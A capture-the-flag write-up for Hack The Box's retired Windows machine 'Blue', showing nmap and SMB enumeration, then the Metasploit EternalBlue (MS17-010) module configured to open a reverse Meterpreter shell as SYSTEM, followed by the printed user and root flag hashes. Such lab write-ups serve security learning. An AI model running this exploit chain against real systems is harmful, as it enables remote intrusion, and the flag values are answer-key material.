---
layout: writeup
name: "blue"
platform: "HackTheBox"
category: "retired"
difficulty: "Unknown"
permalink: /writeups/retired/blue/
date: 2025-11-12
pwned: true
---
# Hack The Box - Blue (10.10.10.40)

## 🧠 Summary

**Blue** is a retired Windows machine notable for its vulnerability to the **EternalBlue** exploit (MS17-010 / CVE-2017-0143). This well-known SMBv1 vulnerability enables remote code execution and was famously used during the WannaCry outbreak. We exploit this flaw using Metasploit to gain a `NT AUTHORITY\SYSTEM` shell and retrieve both user and root flags.

---

## 🔍 Enumeration

### 🔹 Nmap

```bash
nmap -p- blue.htb --min-rate 5000
nmap -p 135,139,445,49152 -sC -sV blue.htb -oN nmap_alert
nmap -p 445 --script vuln blue.htb
```

**Ports:**
- 135/tcp – msrpc
- 139/tcp – netbios-ssn
- 445/tcp – microsoft-ds
- 49152–49157 – high ports (RPC)

**Script Scan Shows:**
- ✅ Vulnerable to **MS17-010**

---

## 📁 SMB Enumeration

```bash
smbclient -L blue.htb
```

Found accessible shares and OS: **Windows 7 Professional SP1 x64**

---

## 💥 Exploitation: EternalBlue (MS17-010)

### 🔸 Metasploit Setup

```bash
msf6 > use exploit/windows/smb/ms17_010_eternalblue
msf6 exploit(...) > set RHOSTS blue.htb
msf6 exploit(...) > set LHOST 10.10.14.12
msf6 exploit(...) > run
```

### 🎯 Result

```bash
[+] 10.10.10.40:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[*] Meterpreter session 1 opened (10.10.14.12:4444 -> 10.10.10.40:49158)
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

---

## 🏁 Flags

```bash
type c:\users\haris\desktop\user.txt
272686dd5f6412c43a417c68a26b2d0c

type c:\users\administrator\desktop\root.txt
34b6ca70429d8510950c8e6a92c21ca4
```

---

## 📌 Notes

- EternalBlue is one of the most impactful SMB exploits in history.
- This machine demonstrates its full remote code execution capability.
- Excellent practice for using Metasploit against legacy Windows targets.

---

*Writeup by [inkedqt](https://github.com/inkedqt)*
